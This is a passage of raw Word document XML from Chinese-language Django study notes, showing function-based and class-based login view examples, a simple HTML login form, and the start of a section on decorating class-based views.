        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>process_response(self, request, response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EFF2DE" w14:textId="77777777" w:rsidR="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">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执行流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67451992" w14:textId="646AB330" w:rsidR="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>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5F111FC4" wp14:editId="0999980C">
            <wp:extent cx="6343650" cy="204787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43650" cy="2047875"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="14267C46" w14:textId="25D0E138"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024</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简述什么是</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>FBV</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CBV</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237A57E2" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>FBV 基于函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278A3366" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># FBV 写法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE28FAA" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DAE7521" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> url(r'^login/$',views.login, name="login"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D03CF1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17BECE1B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF5B282" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def login(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CDF0C2" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6899F98C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76075D1A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="138BA835" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request,"login.html")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC0B32C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA6887C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CECD4B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A6A4B1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;html lang="en"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1908EA1A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0609AC15" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;meta charset="UTF-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1B63CB" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D02523" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292D60A5" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;title&gt;登录页面&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE164DF" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE7A210" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4144F6" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;form action="{% url 'login' %}" method="post" enctype="multipart/form-data"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FF62A9" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="text" name="user2"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0478F0AC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="file" name="file"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7D3FE6" w14:textId="4CF4A583" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="submit" value="提交"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560955BC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2AFED0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7E5284" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3093CD" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EA3176F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>CBV 基于类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C6CFBE" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"># urls.py    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231CA4BC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">url(r'^login/$',views.Login.as_view(), name="login"), </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE88BAD" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20433B59" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E489475" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views import View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51741F26" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>class Login(View):   # 类首字母大写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDBDC0E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0395EA78" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return render(request,"login.html")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2950A7EE" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def post(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164720FE" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C96759" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HttpResponse("OK")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668E8836" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A993815" w14:textId="607E7079" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73096028" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>=================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BAD943" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>class IndexView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202DCD90" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1833C835" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 如果是crsf相关，必须放在此处</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15946A41" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def dispach(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BD00A6" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 通过反射执行post/get </w:t>
      </w:r>
    </w:p>
